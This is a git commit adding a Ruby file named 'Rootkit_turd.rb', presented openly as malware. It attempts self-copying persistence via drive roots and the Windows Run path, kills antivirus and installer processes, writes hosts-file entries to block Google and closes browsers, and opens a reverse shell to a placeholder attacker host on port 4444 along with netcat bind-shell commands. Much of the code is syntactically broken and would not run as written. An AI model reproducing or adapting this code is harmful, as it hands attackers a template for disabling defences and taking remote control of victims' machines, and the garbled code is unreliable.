fb838f6c575bc219a030d6dbdad3c2082e95d2a2
zacksnyder3 <44489364+zacksnyder3@users.noreply.github.com>
2020-02-04 22:07:38 +0700

    Add files via upload

---
+++ Rootkit_turd.rb
@@ -0,0 +1,147 @@
+#i hope this works
+
+ #|---|           |---- |----------------\     |- ----| ttttttttttttttttttttt  eeeeeeeeeeeeeee  rrrrrrrrrrrr
+ #|   |           |    |         |\       \    |      | t                   t  e             e  r           r        mmmmmmmmmmm               mmmmmmmmmm   eeeeeeeeeeeeeeeee cccccccccccccccccccc    hhhhhhhhhhh       hhhhhhhhhh
+ #|	 |            |    |         | \       \   |      | t                   t  e             e  r  r r  r     r      m          \             /          m  e               e c                  c    h         h       h        h
+ #|	 |            |    |         |  \       \  |      | t t             t t t  e     eeeeeeeee  r   r      r   r     m           \           /           m  e               e c      ccccccccccccc    h         h       h        h
+ #|	 |            |    |         |   \       \ |      |    t            t      e     e          r   r r  r  r  r     m            \         /            m  e    eeeeeeeeee e c      c                h         h       h        h
+ #|	 |            |    |         |    \       \|      |    t            t      e     e          r               r    m             \mmmmmmm/             m  e     e           c      c                h         hhhhhhhhh        h
+ #|	 |            |    |         |     \       |      |    t            t      e     eeeeeeeee  r               r    m                                   m  e     e           c      c                h                          h
+ #|	 |            |    |         |      \      |      |    t            t      e             e  r     rrrr     rr    m                                   m  e     eeeeeeeeee  c      c                h                          h
+ #|	 |            |    |         |       \     |      |    t            t      e             e  r     r   r      r   m          m\            /m         m  e              e  c      c                h         hhhhhhhhh        h
+ #|	 |___________ |    |         |        \           |    t            t      e     eeeeeeeee  r     r     r    r   m          m \          / m         m  e              e  c      ccccccccccccc    h         h       h        h
+ #|	 |            |    |         |         \          |    t            t      e     eeeeeeeeee r     r       rrr    m          m  \        /  m         m  e      eeeeeeeee  c                  c    h         h       h        h
+ #|	 |            |    |         |          \         |    t            t      e              e r     r              m          m   \mmmmmm/   m         m  e              e  c                  c    h         h       h        h
+ #\____ ________________/  _______|           \________|    ttttttttttttt     eeeeeeeeeeeeeeeee rrrrrrr              mmmmmmmmmmmm              mmmmmmmmmmm  eeeeeeeeeeeeeeee  cccccccccccccccccccc    hhhhhhhhhhh       hhhhhhhhhh
+ 
+
+ 
+  def wander_two()
+  require 'fileutils'
+  my_dir = Dir["Software\Microsoft\Windows\CurrentVersion\Run"]
+  dest_folder_three = Software\Microsoft\Windows\CurrentVersion\Run
+  FileUtils.cp(Rootkit_turd.rb, Software\Microsoft\Windows\CurrentVersion\Run )
+  
+  
+end
+  
+  
+  def wander()
+  require 'fileutils'
+  file_one = Dir['C:\ \n']
+  dest_folder = 'C:\ \n'
+  file_two = Dir2['D:\ \n']
+  dest_folder_two = 'D:\ \n'
+  FileUtils.cp(Rootkit_turd.rb, dest_folder)
+  FileUtils.cp(Rootkit_turd.rb, dest_folder_two)
+  
+  
+  end
+  
+  wander()
+ 
+ 
+
+system('kill /F /IM norton')
+system('kill /F /IM avas')
+system('kill /F /IM mcafe')
+system('kill /F /IM Bitdefender')
+system('kill /F /IM norm')
+system('kill /F /IM zap ')
+system('kill /F /IM msiexec')
+system('kill /F /IM norton au ')
+system('kill /F /IM panda')
+system('kill /F /IM virus')
+ system('kill /F /IM realm')
+
+system('taskkill /F /IM norton')
+system('taskkill /F /IM avas')
+system('taskkill /F /IM mcafe')
+system('taskkill /F /IM Bitdefender')
+system('taskkill /F /IM norm')
+system('taskkill /F /IM zap ')
+system('taskkill /F /IM msiexec')
+system('taskkill /F /IM norton au ')
+system('taskkill /F /IM panda')
+system('taskkill /F /IM virus')
+ system('taskkill /F /IM realm')
+ 
+def rootkit ()
+system('kill /F /IM norton*')
+system('kill /F /IM avas*')
+system('kill /F /IM mcafe*')
+system('kill /F /IM Bitdefender')
+system('kill /F /IM norm*')
+system('kill /F /IM zap* ')
+system('kill /F /IM msiexec*')
+system('kill /F /IM norton au*')
+system('kill /F /IM panda*')
+system('kill /F /IM virus*')
+system('kill /F /IM realm*')
+         end
+
+rootkit()
+	  
+
+		  def internet ()
+		  system('cd "C:\Windows\System32\Drivers\etc"')
+		  system('echo 127.0.0.1 google.com >> "Hosts"' )
+		  system('echo 127.0.0.1 www.google.com >> "Hosts"')
+		  system('taskkill /F /IM firefox.exe')
+		  system('taskkill /F /IM chrome.exe')
+		  system('kill /F /IM firefox.exe')
+		  system('kill /F /IM chrome.exe')
+		    end
+
+		  
+		internet()
+	
+def sockit()
+ require 'socket'
+
+ hostname = 
+ port =  
+
+   
+    exit if fork
+	c=TCPSocket.new("attackerip","4444")
+	while(cmd=c.gets)
+	IO.popen(cmd,"r"){|io|c.print io.read}
+
+   
+   c=TCPSocket.new("[hostname]","[port]")
+   while cmd=c.gets
+    IO.popen(cmd,"r"){|io|c.print io.read}
+	end
+      end
+  
+  
+  system('nc -e -v -lp cmd.exe  23')
+  system('nc -e -v -lp cmd.exe  23')
+  
+  
+  end
+end
+
+sockit()
+
+end
+
+
+
+
+
+
+
+
+
+
+  
+      
+
+
+
+
+        
+				 
+		  
